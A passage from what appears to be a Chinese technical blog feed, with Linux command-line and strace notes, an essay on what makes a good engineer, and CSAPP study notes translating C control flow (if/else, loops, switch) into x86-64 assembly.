file.txt</li><li>repren或者rename可以批量重命名文件</li><li>diff比较文件/文件夹的改变</li><li>对于二进制文件，strings（包括 grep 等工具）可以帮助在二进制文件中查找特定比特</li><li>对于二进制文件，使用 hd，hexdump 或者 xxd 使其以十六进制显示，使用 bvi，hexedit 或者 biew 来进行二进制编辑</li><li>iconv更改文本编码</li></ul><h1 id="系统调试"><a href="#系统调试" class="headerlink" title="系统调试"></a>系统调试</h1><ul><li>curl可以用于系统调试（-I选项可以仅仅输出document info），也可以尝试github上的开源项目httpie</li><li>htop获取cpu、硬盘的使用状态</li><li>netstat和ss可以查看网络细节</li><li>mtr用来跟踪路由、确定网络问题</li><li>strace和lstrace可以跟踪调试一个程序</li><li>ldd可以检查共享库</li><li>/proc目录下有重要信息的文件：/proc/cpuinfo，/proc/meminfo，/proc/cmdline，/proc/xxx/cwd，/proc/xxx/exe，/proc/xxx/fd/，/proc/xxx/smaps（这里的 xxx 表示进程的 id 或 pid）</li><li>查看系统信息：<code>uname -a</code>、<code>lsb_release -a</code>、neofetch</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">the-art-of-command-line</a></li><li><a href="https://explainshell.com/">https://explainshell.com/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何成为一个优秀的工程师</title>
    <link href="/p/8a52ccc/"/>
    <url>/p/8a52ccc/</url>
    
    <content type="html"><![CDATA[<p> “工程师是科学家；工程师是艺术家；工程师也是思想家。”一位伟大的工程师曾经提出过这样的一段感言。不错，工程师是利用自然科学来创造工程的人。工程既 是物质的也是思想上的。许多不朽的工程，伟大的发明以及出神入化的技术方案，许多人往往只看到了他们的瑰丽，而作为工程师则更应该看到设计的灵魂。因此我 们应该深入的理解“工程师也是艺术家和思想家”。工程设计的本身就是一种艺术，也是工程师思想的结晶。一部精密的机械设备，一个高效而又健壮的程序，一个 复杂而又无懈可击的电路，这些都反映着一些杰出工程师的思想和灵魂，有时你甚至会认为他们的生命已经融入到设计中。</p><p>  成为一个杰出工程师最重要的因素就是“热爱自己的职业”。毕竟兴趣是最好 的老师，许多优秀的电子工程师都是从小作为电子爱好者的。爱好不仅要体现在行动中更要深入内心甚至深入骨髓。有许多人问：“每天应该花多长时间在学习中和 工作中？”可以肯定一份耕耘就会换来一份收获，但作为工程师和科学家想取得成功并不是比赛谁花的时间最多，而是看谁付出了更多的“思考”。不要以为一个学 生坐在自习教室里看了多少小时的书就是“勤奋”，也可能比呆在寝室里的学生还要“懒惰”。也就是说“勤奋”是大脑的勤奋，而不是身体和和形式上的勤奋。我 学电子也差不多有15年了，也发现了很多问题。一次别人问我你每天花多长时间来工作，我回答他：“每天除了吃饭睡觉几乎都在思考。”不夸张的说我的很多工 程构想都是在梦境中诞生的。每天早起床后刷牙的时候、上班的路上、吃饭的时候甚至和别人谈话的空闲瞬间都有可能诞生灵感。当然热爱工程师职业的前提是一定 要能领略到工程和自然科学中的美感。一个优秀的工程师同时也是一个热爱科学的人，从科学的常识到科学的精神都会渗透到他的生活中。一次我看到一位教研室里 的老师安排答辩的顺序，尽管这位老师在机电领域写了很多的书也在所谓“理论领域”有很多建树，单从他安排这样一个简单的顺序来看，他并不是个理论很高的 人。因为在我看来他的工作方法是效率极低的。换句话说就是在他的生活中没有科学的精神可言。</p><p>  一个工程师和科学家在生活中也是工程师和科学家。这个问题引出后我们要提到的是培养自己的思维品质，包括思维的习惯，深度和广度，以及思维方式和思维素材 的选取。成为一个工程师确实有很多品质是天生的和决定性的，学校的培养和自己的努力也只是一些辅助措施。一个人曾经问我一个关于感性负载的问题，其实我心 理很清楚他并不理解这里面最基本的物理概念，首先对电感的认识就不是用语言和数学公式能解释得了的。所以物理学和数学的基础是对工程师有很高要求的，这里 所提到的物理学和数学是指一种最基本的认识而不是停留于表面的文字和公式。我可以推断这个人不太适合作工程师，其实他提出的问题都真真切切的存在于生活 中，抬头看看日光灯的启动，或者当你看到电源插头的放电瞬间。可这每一个瞬间都被示为理所应当的话就错了，那样当牛顿看到苹果落地时也会感觉理所应当的。</p><p>  每个人的思维着眼点和注意的方面都不相同，很多人从小就会将注意放在自然科学之上，这些孩子中有很多就是未来的工程师。比如一个10岁的小学生看到一幢大 楼，他会马上考虑大楼是如何建造的，塔吊又是怎么一节一节接起来的，那么高的大楼外墙的玻璃是如何安装的。另一个孩子会想工程师真伟大，还会想到一些诗句 来抒发内心的感受。显然两个孩子一个可能更适合作工程师另一个适合成为文学家。所以人们经常说，每个人都有自己的长处和优点。有些人的长处和思维方式在工 程师职业中无法发挥，可中国教育的教条化却无法让每个人都能做自己喜欢的专业。我的一个大学同学是文学爱好者，对中国历史和社会有许多见解，阅读广泛文笔 也好，可偏偏学了电子这个专业，这不是人才的浪费吗。所以工程师和科学家在生活中也是工程师和科学家，而不是工作时和端起书本时才是。很多学生很努力的去 学习，可一直无法入门就是这个原因。当拿起书本时发现一个问题或者老师提出一个问题后他们会努力的解决，可放下书本就不会再自己提出问题和独立的思考了。</p><p>  我从来不认为中国的教育是真正的“教育”，书本、试卷、分数、所谓的答案都是教条的，就好象一条生产线给每个经过其中的学生盖上一个学历的烙印。将创造性 和个人的特长统统抹杀，再加上长期以来的教育大跃进和人才评定标准的偏差，无数天才失去了发展机会。本来没有那么多的教育资源却非要扩招–扫盲。将大学 教育至于尴尬境地，应届生就业就是最好的例子。所以请不要抱怨工作机会少，中国是非常缺乏工程师的呀！缺到让很多公司开始“呐喊”的程度。工程师的缺乏又 和应届理工科毕业生的过剩形成矛盾。所以你不要以为学习成绩高就能成为一个好的工程师，要清楚的认识到学校的教育和社会需求之间的距离。</p><p>  工程师要有“自己的思想”。很多学生在读书过程中养成了一些很不好的习 惯，比如思考深度不够，和不会独立思考。一个公式放在面前能做题，能考试就OK吗？自然科学好比一个花园，一些科学巨匠写下了无数“不朽的文章”来描述 它。数学公式就好比文章中的文字和句子，只是做文字游戏或者简单的背诵有什么意义吗？请问问自己你对这个“大花园”了解多少。你闭上眼睛能想象出这个花园 的景象吗？记得我曾问一个大四毕业设计的学生你物理学的怎么样。他回答我“还好”，可又补充说“就是公式忘了”。工作中他看到我随笔可以写出很多方程，惊 讶的说我的记忆力真好。我说“我根本就没背过公式”。因为我记得“花园”是什么样的，即使哪位大家用什么词汇描述的“花园”我记不清，可我依然能清楚的描 述出来。这才是理论，理论不是指“文字”和公式而是前人的思想。</p><p>  许多学电子的学生说模拟技术难学，我告诉他们其实学好模拟技术并不是要学好模拟电子本身。世界本来就是模拟的，所有的物理量都是模拟的，这就是模拟。所以 你对自然科学的最根本看法和世界观直接决定模拟水平的高低，也就是物理学水平的高低。我的意见是：不要以为拿着模电书学下去就能有本质的改变，一定要提高 对事物的认识和对自然科学的理解，提高对模拟量的驾御能力。重要的是思维方式，和对概念的感性认识。</p><p>  思考问题要有深度，思维的深度是一种习惯。有些人总是喜欢点到为止，他甚 至没有意识到我还可以再深入的思考。作为工程师和科学家要培养深邃的思考习惯。一些学生看到一道物理题，认为作对就好的人居多。可你是否发现了其中的内在 联系，甚至从考点中受到启发。有很多高中学生喜欢做大量的习题，结果效果却不理想。就是因为这些学生只是在“做题”，没有付出更多的思考。所以工程师要注 重概念性的思考然后深入进去，知其然，更要知其所以然。</p><p>  工程师要重视实践，自然科学不管发展到何时都离不开实验。电子学本身就是 为了指导工程实践。所以不要谈空洞的理论。现在很多院所都面临这样的问题，总是谈一些空洞的理论，甚至错误的但还不以为然的理论。实践可以提高对自然科学 的认识甚至改变着我们的世界观，只有这种认识提高了才可能创造和应用有价值的理论。我们不要“玩弄理论”，但要重视理论。理论是思想，是认识，不是公式和文字。</p><p>  另一方面，我们还要重视理论。因为你是电子工程师，而不是电子爱好者。工程师要从整体到细节全面的把控你的工程。人做事是一定要犯错误的，工程师要将这样 的错误减到最少。因此全面的理论和对工程对象的认识是必须的。一些从电子爱好者出身的工程师比较容易忽视理论，认为把东西做出来了就可以。当然是要把东西 作出来，但我们最终是要掌握尖端的技术，推动中国科技的发展。不可能象电子爱好者那样拿过别人的图纸来“制作”了事。IT技术发展迅速，理论的发展也非常 迅速。我们一定要接受潮水般的新观念和新技术，工程师必须有全面而又坚实的理论作为后盾。我们学习信息技术就好比盖一座大厦，我们可以很快掌握流行的开发 工具和技术–可以盖个比较高的大楼，可是没有全面坚实的理论作为地基，是不可能盖成摩天大厦的。而且理论体系一定要完整，IT技术本身就是多学科交叉产 生的，它已经涉及太多的东西了。所以在这个行业内如果掌握更多更全面的知识是非常必要的。搞硬件的往往容易忽略软件方面的东西。现在哪里有离开软件的硬件 和离开硬件的软件呢？而且一个工程师不仅要懂得本专业的知识，还要有广泛的自然科学知识，只有这样才能成为出色的工程技术人员。</p><p>  培养自己的学习方法也是工程师的必修课。知识爆炸的年代里，仅仅靠学校里 学来的一点皮毛想成为优秀的工程师是不可能的，90%的知识都要靠自己去学习。很多学校刚毕业的学生并不会自学。拿过一本书来一阵看，看不懂就咬牙看下 去，最后仍在一边。其实自学是非常讲究技巧和方法的。当然每个人都有自己的一套好办法。我通常把知识分成几类：</p><p>1.基础知识 —-包括数物化和专业基础。 </p><p>2.流行的技术 —-比如嵌入式系统开发，大家都在做的技术。 </p><p>3.未来将要流行的技术 —-比如生物DSP技术，就是你对未来的预测。 </p><p>4.我要用到的技术 —-就是你工程中急需使用的。 </p><p>5.其他学科的重要进展 —-紧跟科技发展的脚步是必须的。</p><p>  我通常均匀的分配时间，而不忽略任何任何一个方面的进展，这样才能保证知识体系的不断更新和扩充。这只是宏观上的精力分配，具体的学习过程当然因人而定， 但一定要有战略的进行。工程师做任何事情都要有计划有步骤的去执行。逻辑不仅仅是体现在程序中更要体现在学习和生活的进程中，也就是做任何事都要科学的安 排时间，根据自己的情况制定方案。大家可以参考“大脑思维图谱”的方法。</p><p>  工程师做事要严谨求实。神州飞船由多少复杂的系统构成，如果每个部件都有99.9%的成功率，恐怕到最后返回的时候连一半的安全性都谈不上。所以工程师一 定要严谨，从整体到每个细节都要有足够的重视程度。千里之堤溃于蚁穴就是这个道理。工程师不能接受“差不多”这样的词汇。行就是行，不行就是不行，这是工 程师最基本的素质。一次公司里的一个工程师拿了一块作好的超声前端板交给我，并说板已OK了。可当我问他信噪比如何时，却回答我“差不多”。我理解差不多 就还差，让他拿回去什么时候不差了再交给我。所以工程师要用指标说话，要用实践说话，差不多不是工程师的嘴里应该出现的词汇。</p><p>  工程师还要注重积累。一个好的程序员和电路设计师就是一个好的收藏家，不仅收藏自己的智慧结晶更要收藏别人的智慧结晶。IT技术领域有无数的巨匠和天才将 他们智慧沉淀于现代科技之中，所以我们要不断的积累好的做法和前人的思想。你的周围会有很多人的很多东西值得你学习，你应该将这些作为财富积累起来，总有 一天会发挥出作用。另外我们学习的不仅是简单的知识更是前人对知识的理解和对工程的看法。比如每个人眼中的电阻都不相同，你要主动去了解高手眼中的电阻是 什么东西。</p><p>  工程师不要过分的将注意力放到开发本身而看不清“开发”。这样的话听起来有些绕口,但其实很简单,就是要在一定的高度上看整个开发过程,而不要陷入某个具 体问题无法自拔。不识庐山真面目，只因身在此山中。就是这个道理。尤其是遇到问题后容易出现无法自拔的现象，结果一头雾水什么都是一团糟，这时就需要从更 高的角度从新审视问题，找到突破口，而不要钻了牛角尖。</p><p>  工程师不要轻易问别人问题，解决问题的过程和结果同样重要。有一些同学会经常向老师提出问题，这也是好事，说明某某学生爱学习。可我们并不提倡这些，相反 的如果能自己解决问题才是最好的。要学会独立的猎取信息和知识，并从其中得到自己判断。每个人在工作中都会遇到很多问题，在学校的时候有老师去解答，在工 作单位又有谁能解答呢？或者当你做的是最尖端的技术时你能去问谁呢！所以工程师要有独立处理问题的能力。不要做思想上懒惰的人。中国教育往往要求学生考出 高分，答对答案就是好学生。所以老师告诉的答案只要记住就OK。可老师告诉你的答案能说明你自己具备了解题能力吗？请不要相信这样的分数，至少它无法反映 你的真实水平。</p><p>  工程师要有《亮剑》精神。用都梁的话说，古代剑客明知对方是天下第一剑客，明知是死也要亮出宝剑，没有这个本事就别当剑客。“尽管敌强我弱，尽管身陷重 围，我们也要亮剑”。工程师也要敢于挑战对手，敢于战胜自己。一项工程如果连做都不敢做还能谈成功的问题吗？成功是一种习惯，一种来源于自己的信心。战略 上轻视“敌人”，战术上重视“敌人”。</p><p>  工程师即要有个人英雄主义情节又要能融入团队。出色的个人能力和人格魅力是何等的宝贵。我们在崇拜盖茨和乔布斯的同时不要忘记他们身后庞大而又高效的研发团队。以一戟之力完成霸业的英雄已不属于这个时代。所以团队的合作才是创造神话的必经之路。</p><p>  工程师要有发展的眼光，不仅要能在复杂的技术和市场面前游刃有余，更要对未来的发展态势做出精确的展望。只有比别人想的远才能比对手走的更远。当然这与坚 实的基础和勤奋的思考是密不可分的，在群雄逐鹿的当今IT界，恐怕需要更多的胆识才能做到。要不断的关注技术和市场以及其它领域的发展，什么时候这种关注 放松，什么时候就会被竞争所淘汰。</p><p>  要在竞争和解决问题中体会生活，研发和竞争是每个工程师不可避免的现实。大家每天都会遇到新的困难，可这才是工程师的生活，要轻松的活在这些问题之中，并 体会其中的快乐和成功时刻的兴奋。很多工程师抱怨说做研发太累了，这里的“累”是一种心理的感受，工程师的职业就是不断的克服困难迎接新的挑战。我刚开始 做研发时也整天愁眉不展，可现在同时做几个大的工程，同时面对几十个技术难题，我觉得自己每天因为能做这样的事情而感到非常的快乐和充实，如果哪天自己没 事可做就会觉得很不适应，总要找些问题来思考。</p>]]></content>
    
    
    <categories>
      
      <category>文摘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统工具：strace</title>
    <link href="/p/d936e762/"/>
    <url>/p/d936e762/</url>
    
    <content type="html"><![CDATA[<h1 id="系统调用简介"><a href="#系统调用简介" class="headerlink" title="系统调用简介"></a>系统调用简介</h1><p>进程通过<strong>系统调用</strong>使用内核服务。系统调用会进入内核，让内核执行服务然后返回<br><img src="https://img-blog.csdnimg.cn/c2244f0c54164008988ed3e58eda9cff.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>一些常见的系统调用:</strong></p><table><thead><tr><th>系统调用</th><th>描述</th></tr></thead><tbody><tr><td>fork()</td><td>创建进程</td></tr><tr><td>exit()</td><td>结束当前进程</td></tr><tr><td>wait()</td><td>等待子进程结束</td></tr><tr><td>exec(filename, *argv)</td><td>加载并执行一个文件</td></tr><tr><td>open(filename, flags)</td><td>打开文件，flags 指定读/写模式</td></tr><tr><td>read(fd, buf, n)</td><td>从文件中读 n 个字节到 buf</td></tr><tr><td>write(fd, buf, n)</td><td>从 buf 中写 n 个字节到文件</td></tr><tr><td>close(fd)</td><td>关闭打开的 fd</td></tr><tr><td>unlink(filename)</td><td>删除文件</td></tr></tbody></table><h1 id="strace的常见用法"><a href="#strace的常见用法" class="headerlink" title="strace的常见用法"></a>strace的常见用法</h1><p>strace可以使你在不知道程序源代码的情况下跟踪应用程序的系统调用</p><p>让我们打开tldr查看strace的常见用法：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Troubleshooting tool <span class="hljs-keyword">for</span> tracing <span class="hljs-keyword">system</span> calls.<br>  More information: <span class="hljs-keyword">https</span>://manned.org/strace.<br><br>  - Start tracing <span class="hljs-keyword">a</span> specific <span class="hljs-built_in">process</span> <span class="hljs-keyword">by</span> its PID:<br>    strace -p pid<br><br>  - Trace <span class="hljs-keyword">a</span> <span class="hljs-built_in">process</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">filter</span> output <span class="hljs-keyword">by</span> <span class="hljs-keyword">system</span> call:<br>    strace -p pid -e system_call_name<br><br>  - Count <span class="hljs-built_in">time</span>, calls, <span class="hljs-keyword">and</span> errors <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">system</span> call <span class="hljs-keyword">and</span> report <span class="hljs-keyword">a</span> summary <span class="hljs-keyword">on</span> <span class="hljs-title">program</span> <span class="hljs-title">exit</span>:<br>    strace -p pid -c<br><br>  - Show <span class="hljs-keyword">the</span> <span class="hljs-built_in">time</span> spent <span class="hljs-keyword">in</span> every <span class="hljs-keyword">system</span> call:<br>    strace -p pid -T<br><br>  - Start tracing <span class="hljs-keyword">a</span> program <span class="hljs-keyword">by</span> executing <span class="hljs-keyword">it</span>:<br>    strace program<br><br>  - Start tracing <span class="hljs-built_in">file</span> operations <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> program:<br>    strace -e trace=<span class="hljs-built_in">file</span> program<br></code></pre></td></tr></table></figure><p>打印出运行<code>echo wdnmd </code>过程的系统调用：<br><img src="https://img-blog.csdnimg.cn/4c57f58559694d13857a121a2315dd9d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP：程序的机器级表示-3</title>
    <link href="/p/a9307f29/"/>
    <url>/p/a9307f29/</url>
    
    <content type="html"><![CDATA[<p>思考两个问题：</p><ul><li>控制结构相对应的机器语言的控制结构（汇编语言）</li><li>C语言实现的分支、循环、开关等操作，在底层的机器语言是如何实现的？</li></ul><h1 id="条件码的隐式赋值"><a href="#条件码的隐式赋值" class="headerlink" title="条件码的隐式赋值"></a>条件码的隐式赋值</h1><h2 id="几种标志寄存器"><a href="#几种标志寄存器" class="headerlink" title="几种标志寄存器"></a>几种标志寄存器</h2><ul><li>CF  进位标志位(Carry Flag, 无符号数)</li><li>SF  符号标志识位(Sign Flag, 有符号数)</li><li>ZF  零标志位 ( Zero Flag )</li><li>OF 溢出标志位( Overflow Flag , 有符号数)</li></ul><h2 id="add指令"><a href="#add指令" class="headerlink" title="add指令"></a>add指令</h2><p>addq Src,Dest 隐含了：t = a+b</p><ul><li>CF=1 <ul><li>进位</li><li>当两数相加产生进位/两数相减产生进位的情况下CF=1</li><li>127+127、1-2</li><li>把两个数当做无符号数，相加结果是否有进位？若有进位，则CF=1</li></ul></li><li>ZF=1<ul><li>运算结果为0</li></ul></li><li>SF=1 <ul><li>将t看做是有符号数，t&lt;0的情况下，SF=1</li><li>运算结果可以看做是有符号数，也可以看做是无符号数，因此具有两种含义</li><li>假设运算结果为10000001，可以看做是无符号数+129，也可以看做是有符号数-1</li></ul></li><li>PF<ul><li>奇偶标志位，如果运算结果的二进制表示中1的个数为偶数，PF=1，否则为0</li></ul></li><li>OF=1<ul><li>有符号数(补码)溢出的情况</li><li>把两个数当做有符号数，相加结果是否有溢出？</li><li>(a&gt;0 &amp;&amp; b&gt;0 &amp;&amp; t&lt;0) || (a&lt;0 &amp;&amp; b&lt;0 &amp;&amp; t&gt;=0)</li></ul></li></ul><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>cmpq Src1, Src2会计算Src2-Src1的值并改写条件码，但是不会改变这两个操作数</p><ul><li>对标志寄存器值的判断依据与上面add指令相似</li><li>t=Src2-Src1</li></ul><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><p><img src="/image/assembly-cmp.png"></p><h1 id="C语言到汇编语言的转换"><a href="#C语言到汇编语言的转换" class="headerlink" title="C语言到汇编语言的转换"></a>C语言到汇编语言的转换</h1><h2 id="if-else-语句"><a href="#if-else-语句" class="headerlink" title="if else 语句"></a>if else 语句</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">absdiff</span> <span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result;<br>  <span class="hljs-keyword">if</span> (x &gt; y)<br>    result = x-y;<br>  <span class="hljs-keyword">else</span><br>    result = y-x;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>转换为如下goto语句：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">absdiff_j</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> result;<br>    <span class="hljs-keyword">int</span> ntest = x &lt;= y;<br>    <span class="hljs-keyword">if</span> (ntest) <span class="hljs-keyword">goto</span> Else;<br>    result = x-y;<br>    <span class="hljs-keyword">goto</span> Done;<br> Else:<br>    result = y-x;<br> Done:<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>转换为如下汇编：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">absdiff:</span><br>   cmpq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span>  # <span class="hljs-keyword">x</span>:y<br>   jle     .L<span class="hljs-number">4</span><br>   movq    <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   subq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   <span class="hljs-keyword">ret</span><br>.L<span class="hljs-number">4</span>:       # <span class="hljs-keyword">x</span> &lt;<span class="hljs-operator">=</span> y<br>   movq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   subq    <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>对于三目运算符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">val = Test ? Then_Expr : Else_Expr;<br></code></pre></td></tr></table></figure><p>也可表示为ifelse语句，从而改写为汇编语句</p><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">pcount_do</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> x)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    result += x &amp; <span class="hljs-number">0x1</span>;<br>    x &gt;&gt;= <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span> (x);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>计算x的二进制表示中有多少个1</li></ul><p>转化为goto语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">pcount_goto</span> <span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result = <span class="hljs-number">0</span>;<br> loop:<br>  result += x &amp; <span class="hljs-number">0x1</span>;<br>  x &gt;&gt;= <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span>(x) <span class="hljs-keyword">goto</span> loop;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>转换为如下汇编：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"> movl  $0, %eax<br>.L2:<br>   movq  %rdi, %rdx 存储result<br>   andl  $1,   %edx 按位与<br>   addq  %rdx, %rax rax是返回值<br>   shrq  %rdi     右移一位<br>   jne   .L2     跳转<br>   rep; ret<br></code></pre></td></tr></table></figure><p>for循环转化为while的通用版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span> (Init; Test; Update )<br>    Body<br>---<br><br>Init;<br><span class="hljs-keyword">while</span> (Test ) &#123;<br>    Body<br>    Update;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>do-while循环与while循环相似。两者唯一的分别：do-while循环将先会执行一次循环内的代码，再去判断循环条件。所以无论循环条件是否满足，do-while循环内的代码至少会执行一次。因此，do-while循环属于后测循环(post-test loop)。</p></blockquote><p>do-while循环转化为goto的通用版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">do</span> </span><br><span class="hljs-function">  Body</span><br><span class="hljs-function"><span class="hljs-title">while</span> <span class="hljs-params">(Test)</span></span>;<br><br>---<br><br>loop:<br>   <span class="hljs-function">Body</span><br><span class="hljs-function">   <span class="hljs-title">if</span> <span class="hljs-params">(Test)</span></span><br><span class="hljs-function">      <span class="hljs-keyword">goto</span> loop</span><br></code></pre></td></tr></table></figure><h2 id="switch结构"><a href="#switch结构" class="headerlink" title="switch结构"></a>switch结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">switch</span>(x) &#123;<br>  <span class="hljs-keyword">case</span> val_0:<br>    Block <span class="hljs-number">0</span><br>  <span class="hljs-keyword">case</span> val_1:<br>    Block <span class="hljs-number">1</span><br>    • • •<br>  <span class="hljs-keyword">case</span> val_n<span class="hljs-number">-1</span>:<br>    Block n–<span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.section</span><span class="hljs-string">.rodata</span><br><span class="hljs-string">.align</span> 8<br><span class="hljs-string">.L4</span>:<br><span class="hljs-string">.quad</span><span class="hljs-string">.L8</span><span class="hljs-comment"># x = 0</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L3</span><span class="hljs-comment"># x = 1</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L5</span><span class="hljs-comment"># x = 2</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L9</span><span class="hljs-comment"># x = 3</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L8</span><span class="hljs-comment"># x = 4</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L7</span><span class="hljs-comment"># x = 5</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L7</span><span 